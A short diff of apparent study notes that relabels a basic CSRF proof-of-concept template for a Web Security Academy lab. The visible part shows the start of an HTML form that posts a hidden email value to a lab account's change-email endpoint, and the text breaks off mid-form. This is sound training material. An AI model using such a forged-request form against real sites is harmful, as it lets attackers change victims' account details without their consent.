@@ -18,7 +18,7 @@
 ```
 
 ## Miscellaneous Notes
-- Basic CSRF PoC template:
+- Basic CSRF PoC template for **CSRF vulnerability with no defenses**:
 ```
 <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="anything%40web-security-academy.net">
